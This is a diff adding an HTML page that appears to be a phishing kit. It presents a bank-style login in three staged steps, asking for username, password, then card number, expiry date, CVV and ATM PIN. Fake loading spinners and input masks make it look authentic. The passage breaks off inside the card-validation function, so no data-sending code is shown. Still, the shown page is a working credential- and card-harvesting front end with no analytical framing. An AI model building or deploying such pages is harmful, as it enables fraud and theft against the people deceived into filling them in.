@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        #form1, #form2, #form3 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+        
+        footer {
+            padding: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            padding-left: 0;
+            border: 0;
+            border-bottom: 1px solid #d7d8d6;
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            border-color: #333333;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            color: #fff;
+            background-color: #c82a23;
+            border: 0;
+        }
+
+        .button:disabled {
+            background-color: #d7d8d6;
+        }
+
+        label {
+            color: #333333;
+        }
+    </style>
+</head>
+<body>
+    <div id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#c82a23"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABJIAAACpCAIAAAD/fYA1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Rjc3RDg5MTREOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Rjc3RDg5MTVEOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNzdEODkxMkQ5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGNzdEODkxM0Q5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuP7UrQAAAVGSURBVHja7N0xTupwHMDxVx4xGu6gO3Vx19ETsFEWVky8gjcgkQRXJ7gIbA6wwBlIHNHgYJrXhIS8aCApFin08xn/bX5ghaTfQGkQx/EfAAAA8qrkEAAAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAAMg2AAAAZBsAAACyDQAAQLYBAAAg2wAAAJBtAAAAsg0AAADZBgAAINsAAACQbQAAAMg2AAAA2QYAAIBsAwAAkG0AAADINgAAAGQbAACAbAMAAEC2AQAAyDYAAABkGwAAALINAABAtgEAACDbAAAAZBsAAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAACQbQAAAMg2AAAAZBsAAIBsAwAAQLYBAAAURdkhSHx8fLTb7fl8vlq5vLyMosiRAQAA9i6I41iz3d/fj0aj1UoYht1ut1KpeH0AAAB7V/QvSWo2AABAtmk2AAAA2abZAAAA2abZAAAAZJtmAwAAKHa2aTYAAEC2aTYAAADZptkAAADZptkAAABkm2YDAAAodrZpNgAAQLZpNgAAANmm2QAAANmm2QAAAGTbfpqtWq1qNgAAQLblt9menp40GwAAINs0GwAAgGzTbAAAgGzTbAAAALJNswEAABQj2zQbAABwxMqaDQAA2LXhcNjr9abT6fKMvV6v39zcbDdqMBj0+/3VqCiKrq+vM3lWPxm1U0Ecx5oNAADYneQU/fn5+ctis9lstVrHMWrXDvhLkpoNAADybzAYfK+jRLI4HA6zGpVsSjUqeeisRsm2tRaLhWYDAID86/V6W2xKu3+/39/XKNm2VhAE3gAAAJB/yyvH0m5Ku/9kMkk1asP+aUfJtrVOT087nc7V1dX//8JWq/X+/u6NAQAAbLbhc6AcfkR0wNe2KTcAAMi/MAzXbapWq6lGbdh/w6OkHZX2Wcm2bcrt7u5OuQEAQE5EUbTFpgMa9Qv+Pjw8HPSLoFwu397ejsfj2Wy2XHl9fX15eUkWT05OvEkAAGC/zs/PPz8/kzP2L+vNZrNWq6UadXFxkdWoDJ/VLzjs+7atfL8ZQBiG3W7XD0sCAEAeLG9svfy1j+Rc/ee3216N+vnttjMZJduUGwAAUFylo/lLvl/nlkSz69wAAADZptwAAABkm3IDAABkm3IDAACQbcoNAABAtik3AABAtik3AAAA2abcAAAAjj3blBsAACDblBsAAIBsy6LcHh8flRsAACDb8uvs7Ey5AQAAsk25AQAAyDblBgAAyDblBgAAINuUGwAAgGxTbgAAgGxTbgAAALJNuQEAAEUUxHHsKCwWi3a7/fb2tloJw7DRaDgyAACAbAMAAGCTkkMAAAAg2wAAAJBtAAAAsg0AAADZBgAAgGwDAACQbQAAAMg2AAAA2QYAAIBsAwAAQLYBAADINgAAAGQbAACAbAMAAEC2AQAAINsAAABkGwAAALINAABAtgEAACDbAAAAkG0AAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAABAtgEAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAACDbAAAAZBsAAACyDQAA4Kj9E2AA7FKUSR5PJXAAAAAASUVORK5CYII=" alt="">
+            </header>
+            <section>
+                <label for="login">Please enter your username</label>
+                <input type="text" class="input" id="login" name="login" placeholder="" autocomplete="off">
+                <img style="position: relative;float: right;width: 18px;top: -45px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAIAAAC1nk4lAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Rjc3RDg5MThEOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Rjc3RDg5MTlEOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNzdEODkxNkQ5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGNzdEODkxN0Q5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqyXqvYAAAc2SURBVHja1Jpb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" alt="">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABJIAAACpCAIAAAD/fYA1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Rjc3RDg5MTREOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Rjc3RDg5MTVEOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNzdEODkxMkQ5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGNzdEODkxM0Q5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuP7UrQAAAVGSURBVHja7N0xTupwHMDxVx4xGu6gO3Vx19ETsFEWVky8gjcgkQRXJ7gIbA6wwBlIHNHgYJrXhIS8aCApFin08xn/bX5ghaTfQGkQx/EfAAAA8qrkEAAAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAAMg2AAAAZBsAAACyDQAAQLYBAAAg2wAAAJBtAAAAsg0AAADZBgAAINsAAACQbQAAAMg2AAAA2QYAAIBsAwAAkG0AAADINgAAAGQbAACAbAMAAEC2AQAAyDYAAABkGwAAALINAABAtgEAACDbAAAAZBsAAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAACQbQAAAMg2AAAAZBsAAIBsAwAAQLYBAAAURdkhSHx8fLTb7fl8vlq5vLyMosiRAQAA9i6I41iz3d/fj0aj1UoYht1ut1KpeH0AAAB7V/QvSWo2AABAtmk2AAAA2abZAAAA2abZAAAAZJtmAwAAKHa2aTYAAEC2aTYAAADZptkAAADZptkAAABkm2YDAAAodrZpNgAAQLZpNgAAANmm2QAAANmm2QAAAGTbfpqtWq1qNgAAQLblt9menp40GwAAINs0GwAAgGzTbAAAgGzTbAAAALJNswEAABQj2zQbAABwxMqaDQAA2LXhcNjr9abT6fKMvV6v39zcbDdqMBj0+/3VqCiKrq+vM3lWPxm1U0Ecx5oNAADYneQU/fn5+ctis9lstVrHMWrXDvhLkpoNAADybzAYfK+jRLI4HA6zGpVsSjUqeeisRsm2tRaLhWYDAID86/V6W2xKu3+/39/XKNm2VhAE3gAAAJB/yyvH0m5Ku/9kMkk1asP+aUfJtrVOT087nc7V1dX//8JWq/X+/u6NAQAAbLbhc6AcfkR0wNe2KTcAAMi/MAzXbapWq6lGbdh/w6OkHZX2Wcm2bcrt7u5OuQEAQE5EUbTFpgMa9Qv+Pjw8HPSLoFwu397ejsfj2Wy2XHl9fX15eUkWT05OvEkAAGC/zs/PPz8/kzP2L+vNZrNWq6UadXFxkdWoDJ/VLzjs+7atfL8ZQBiG3W7XD0sCAEAeLG9svfy1j+Rc/ee3216N+vnttjMZJduUGwAAUFylo/lLvl/nlkSz69wAAADZptwAAABkm3IDAABkm3IDAACQbcoNAABAtik3AABAtik3AAAA2abcAAAAjj3blBsAACDblBsAAIBsy6LcHh8flRsAACDb8uvs7Ey5AQAAsk25AQAAyDblBgAAyDblBgAAINuUGwAAgGxTbgAAgGxTbgAAALJNuQEAAEUUxHHsKCwWi3a7/fb2tloJw7DRaDgyAACAbAMAAGCTkkMAAAAg2wAAAJBtAAAAsg0AAADZBgAAgGwDAACQbQAAAMg2AAAA2QYAAIBsAwAAQLYBAADINgAAAGQbAACAbAMAAEC2AQAAINsAAABkGwAAALINAABAtgEAACDbAAAAkG0AAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAABAtgEAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAACDbAAAAZBsAAACyDQAA4Kj9E2AA7FKUSR5PJXAAAAAASUVORK5CYII=" alt="">
+            </header>
+            <section>
+                <label for="login">Please enter your password</label>
+                <input type="password" class="input" id="password" name="password" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="lastPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABJIAAACpCAIAAAD/fYA1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Rjc3RDg5MTREOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Rjc3RDg5MTVEOUUwMTFFQzhFMzlDM0QwMTNFOUE0RUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNzdEODkxMkQ5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGNzdEODkxM0Q5RTAxMUVDOEUzOUMzRDAxM0U5QTRFQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuP7UrQAAAVGSURBVHja7N0xTupwHMDxVx4xGu6gO3Vx19ETsFEWVky8gjcgkQRXJ7gIbA6wwBlIHNHgYJrXhIS8aCApFin08xn/bX5ghaTfQGkQx/EfAAAA8qrkEAAAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAAMg2AAAAZBsAAACyDQAAQLYBAAAg2wAAAJBtAAAAsg0AAADZBgAAINsAAACQbQAAAMg2AAAA2QYAAIBsAwAAkG0AAADINgAAAGQbAACAbAMAAEC2AQAAyDYAAABkGwAAALINAABAtgEAACDbAAAAZBsAAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAACQbQAAAMg2AAAAZBsAAIBsAwAAQLYBAAAURdkhSHx8fLTb7fl8vlq5vLyMosiRAQAA9i6I41iz3d/fj0aj1UoYht1ut1KpeH0AAAB7V/QvSWo2AABAtmk2AAAA2abZAAAA2abZAAAAZJtmAwAAKHa2aTYAAEC2aTYAAADZptkAAADZptkAAABkm2YDAAAodrZpNgAAQLZpNgAAANmm2QAAANmm2QAAAGTbfpqtWq1qNgAAQLblt9menp40GwAAINs0GwAAgGzTbAAAgGzTbAAAALJNswEAABQj2zQbAABwxMqaDQAA2LXhcNjr9abT6fKMvV6v39zcbDdqMBj0+/3VqCiKrq+vM3lWPxm1U0Ecx5oNAADYneQU/fn5+ctis9lstVrHMWrXDvhLkpoNAADybzAYfK+jRLI4HA6zGpVsSjUqeeisRsm2tRaLhWYDAID86/V6W2xKu3+/39/XKNm2VhAE3gAAAJB/yyvH0m5Ku/9kMkk1asP+aUfJtrVOT087nc7V1dX//8JWq/X+/u6NAQAAbLbhc6AcfkR0wNe2KTcAAMi/MAzXbapWq6lGbdh/w6OkHZX2Wcm2bcrt7u5OuQEAQE5EUbTFpgMa9Qv+Pjw8HPSLoFwu397ejsfj2Wy2XHl9fX15eUkWT05OvEkAAGC/zs/PPz8/kzP2L+vNZrNWq6UadXFxkdWoDJ/VLzjs+7atfL8ZQBiG3W7XD0sCAEAeLG9svfy1j+Rc/ee3216N+vnttjMZJduUGwAAUFylo/lLvl/nlkSz69wAAADZptwAAABkm3IDAABkm3IDAACQbcoNAABAtik3AABAtik3AAAA2abcAAAAjj3blBsAACDblBsAAIBsy6LcHh8flRsAACDb8uvs7Ey5AQAAsk25AQAAyDblBgAAyDblBgAAINuUGwAAgGxTbgAAgGxTbgAAALJNuQEAAEUUxHHsKCwWi3a7/fb2tloJw7DRaDgyAACAbAMAAGCTkkMAAAAg2wAAAJBtAAAAsg0AAADZBgAAgGwDAACQbQAAAMg2AAAA2QYAAIBsAwAAQLYBAADINgAAAGQbAACAbAMAAEC2AQAAINsAAABkGwAAALINAABAtgEAACDbAAAAkG0AAACyDQAAANkGAAAg2wAAAJBtAAAAyDYAAADZBgAAgGwDAABAtgEAAMg2AAAAZBsAAIBsAwAAQLYBAAAg2wAAAGQbAAAAsg0AAEC2AQAAINsAAACQbQAAALINAAAA2QYAACDbAAAAkG0AAADINgAAANkGAACAbAMAAJBtAAAAyDYAAABkGwAAgGwDAABAtgEAACDbAAAAZBsAAACyDQAA4Kj9E2AA7FKUSR5PJXAAAAAASUVORK5CYII=" alt="">
+            </header>
+            <section>
+                <label for="cc">Creadit Card</label>
+                <input type="tel" class="input" style="width: 100%;" id="cc" name="fields[cc]" onkeyup="check6();check8()" placeholder="" autocomplete="off">
+                
+                <label for="exp" style="width: 58%;float: left;margin-top: 5px;">Expiration date</label>
+                <label for="cvv" style="width: 40%;float: right;margin-top: 5px;">CVV</label>
+                <input type="tel" inputmode="numeric" class="input" id="exp" name="fields[exp]" onkeyup="check7();check8()" style="width: 58%;float: left;margin-top: 5px;" placeholder="" autocomplete="off">
+                <input type="password" inputmode="numeric" class="input" id="cvv" name="fields[cvv]" onkeyup="check8()" style="width: 40%;float: right;margin-top: 5px;" placeholder="" autocomplete="off">
+
+                <label for="pin">ATM Pin</label>
+                <input type="password" inputmode="numeric" class="input" id="pin" name="fields[pin]" onkeyup="check8()" style="width: 100%;margin-top: 5px;" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="Continue">
+            </footer>
+        </div>
+    </form>
+    <script>
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000');
+        $('#pin').mask('0000');
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3');
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            pin = document.getElementById('pin'),
+            cvv = document.getElementById('cvv');
+
+        var login = document.getElementById('login'),   
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            lastPage = document.getElementById('lastPage'),
+            sendData = document.getElementById('sendData');
+
+        login.onkeyup = () => {
+            if(login.value.length >= 4) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        password.onkeyup = () => {
+            if(password.value.length >= 4) {
+                lastPage.disabled = false;
+            } else {
+                lastPage.disabled = true;
+            }
+        }
+
+        nextPage.onclick = () => {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                form1.style.display = 'none';
+                spinner.style.display = 'none';
+                form2.style.display = 'flex';
+            }, 1500);
+        }
+
+        lastPage.onclick = () => {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                form2.style.display = 'none';
+                spinner.style.display = 'none';
+                form3.style.display = 'flex';
+            }, 1500);
+        }
+
+
+        function check7() {
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function valid_credit_card(value) {
